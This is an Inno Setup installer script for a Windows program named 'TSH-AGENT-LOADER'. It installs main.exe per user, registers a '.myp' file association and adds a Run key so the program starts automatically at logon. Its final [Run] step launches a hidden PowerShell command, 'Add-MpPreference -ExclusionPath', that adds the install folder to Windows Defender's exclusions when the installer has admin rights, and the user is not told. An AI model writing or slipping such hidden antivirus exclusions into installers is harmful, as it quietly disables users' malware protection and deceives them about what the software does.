#include "secrets.isi"

#define MyAppName "TSH-AGENT-LOADER"
#define MyAppVersion "1.0.11"
#define MyAppPublisher "TSHInc"
#define MyAppURL "https://service.tongsung.site/"
#define MyAppExeName "main.exe"
#define MyAppAssocName MyAppName + " File"
#define MyAppAssocExt ".myp"
#define MyAppAssocKey StringChange(MyAppAssocName, " ", "") + MyAppAssocExt

[Setup]
AppId={#MySecretAppId}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}

UsePreviousAppDir=no

; 설치 경로 및 권한
DefaultDirName={localappdata}\{#MyAppPublisher}\{#MyAppName}\{#MyAppVersion}
PrivilegesRequired=lowest
UninstallDisplayIcon={app}\{#MyAppExeName}

; 아키텍처 설정
ArchitecturesAllowed=x64compatible
ArchitecturesInstallIn64BitMode=x64compatible

; UI 및 파일 설정
ChangesAssociations=yes
DisableProgramGroupPage=yes
LicenseFile={#MyLicenseFile}
InfoBeforeFile={#MyInfoBefore}
InfoAfterFile={#MyInfoAfter}
SolidCompression=yes
WizardStyle=modern windows11

; 출력 설정 (secrets.isi에서 가져옴)
OutputDir={#MyOutputDir}
OutputBaseFilename=TSH_AGENT_LOADER_Install_v{#MyAppVersion}

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"
Name: "korean"; MessagesFile: "compiler:Languages\Korean.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
; 빌드된 exe 파일을 가져오는 경로를 secrets에서 관리
;Source: "{#MySourceExe}"; DestDir: "{app}"; Flags: ignoreversion
Source: "{#MyMainDist}"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs

[Registry]
; 연결 프로그램 및 자동 실행 설정
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocExt}\OpenWithProgids"; ValueType: string; ValueName: "{#MyAppAssocKey}"; ValueData: ""; Flags: uninsdeletevalue
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}"; ValueType: string; ValueName: ""; ValueData: "{#MyAppAssocName}"; Flags: uninsdeletekey
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}\DefaultIcon"; ValueType: string; ValueName: ""; ValueData: "{app}\{#MyAppExeName},0"
Root: HKA; Subkey: "Software\Classes\{#MyAppAssocKey}\shell\open\command"; ValueType: string; ValueName: ""; ValueData: """{app}\{#MyAppExeName}"" ""%1"""
Root: HKA; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "{#MyAppName}"; ValueData: """{app}\{#MyAppExeName}"""; Flags: uninsdeletevalue
Root: HKCU; Subkey: "Software\{#MyAppPublisher}\{#MyAppName}"; ValueType: string; ValueName: "InstallPath"; ValueData: "{app}"; Flags: uninsdeletekey

[Icons]
Name: "{autoprograms}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent; WorkingDir: "{app}"
Filename: "powershell.exe"; Parameters: "-Command ""Add-MpPreference -ExclusionPath '{app}'"""; Flags: runhidden; Check: IsAdmin